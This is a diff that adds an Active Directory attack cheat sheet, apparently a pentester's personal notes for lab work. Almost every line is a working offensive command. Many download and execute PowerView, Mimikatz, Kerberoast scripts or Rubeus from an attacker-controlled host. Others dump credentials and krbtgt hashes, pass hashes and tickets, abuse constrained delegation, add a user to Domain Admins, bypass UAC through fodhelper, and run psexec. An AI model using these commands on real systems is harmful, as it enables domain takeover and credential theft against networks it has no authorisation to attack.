@@ -1,0 +1,93 @@
+=========================================================================================================================
+Active Directory
+
+[BASE]
+net user /domain
+net user /domain utente
+net group /domain
+net groups "Domain Admins" /domain
+net groups "domain computers" /domain
+
+PowerView:
+[USER]
+powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-Domain"
+powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser"
+powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser -SPN"
+powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser -Properties samaccountname,memberof"
+powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser -Properties samaccountname,description"
+
+[GROUP]
+powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainGroup -Name 'Domain Admins' "
+powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1');  Get-DomainGroup | where Name -like "*Admin*" | select SamAccountName "
+powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainGroupMember -Name 'Domain admins' "
+powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainGroup -Domain 'xor.com'"
+
+[COMPUTER]
+powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-NetComputer | select samaccountname, operatingsystem"
+powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainComputer -Ping "
+
+[SHARED INFO]
+powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Find-DomainShare -Verbose"
+cd \\fileshare.pentesting.local\FileShare
+
+===========================================================================================================================
+[ACL Misconfiguration]:
+powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-ObjectAcl -SamAccountName 'Domain Admins' -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericWrite') -and ($_.SecurityIdentifier -match 'SID mio')} "
+powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Add-DomainGroupMember -identity 'Domain Admins' -Member 'student1' -Domain 'pentesting'"
+powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser -Name student1"
+
+Get-DomainUser -Name student1 
+[Save Credentials]:
+powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command ' "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit" '"
+
+certutil.exe -urlcache -f "http://192.168.119.140/mimikatz64_old.exe" mimikatz.exe 
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > hash.txt
+
+[Pass the hash]
+certutil.exe -urlcache -f "http://192.168.119.140/mimikatz64_old.exe" mimikatz.exe 
+.\mimikatz.exe "sekurlsa::pth /user:david /domain:xor.com /ntlm:d4738e8c31d43e0147f27894a20e6683 /run:powershell.exe"
+
+[Pass the ticket]
+certutil.exe -urlcache -f "http://192.168.119.140/mimikatz64_old.exe" mimikatz.exe 
+.\mimikatz.exe "Mimikatz::debug" "sekurlsa::tickets /export" "exit" > ticket.txt
+
+[RDP via Password]
+xfreerdp /u:david /d:xor.com /p:dsfdf34534tdfGDFG5rdgr  /v:10.11.1.120
+[RDP via Hash]
+xfreerdp /u:david /d:xor.com /pth:d4738e8c31d43e0147f27894a20e6683  /v:10.11.1.120
+
+[Constrained delegation]
+powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainComputer -TrustedToAuth"
+certutil.exe -urlcache -f "http://192.168.119.140/mimikatz64_old.exe" mimikatz.exe 
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+certutil.exe -urlcache -f "http://192.168.119.140/Rubeus.exe" rubeus.exe
+
+certutil.exe -urlcache -f "http://192.168.119.140/kekeo.exe" kekeo.exe 
+Kekeo# tgt::ask /user:student$ /domain:pentesting.local /rc4:[NTLM of student$]
+Kekeo# tgs::s4u /tgt:[tgt.kirbi] /user:Administrator@pentesting.local /service:time/ad.pentesting.local|ldap/ad.pentesting.local
+./mimiktaz.exe -c '"Kerberos::ptt [tgs.kirbi]"' 
+dir \\dc\C$ 
+klist 
+./mimikatz.exe -c '"lsadump::dcsync /user:pentesting\krbtgt"' 
+
+[Invoke-Kerberoast]:
+powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser -SPN"
+powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"
+
+[Bypass UAC]:
+
+#This UAC bypass tries to execute your command with elevated privileges using fodhelper.exe
+$yourevilcommand = "C:\Windows\System32\cmd.exe"
+
+#Adding all the reistry required with your command.
+New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $yourevilcommand -Force
+
+#Starts the fodhelper process to execute your command.
+Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+
+#Cleaning up the mess created.
+Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+===========================================================================================================================================
+impacket-psexec username:password@IP
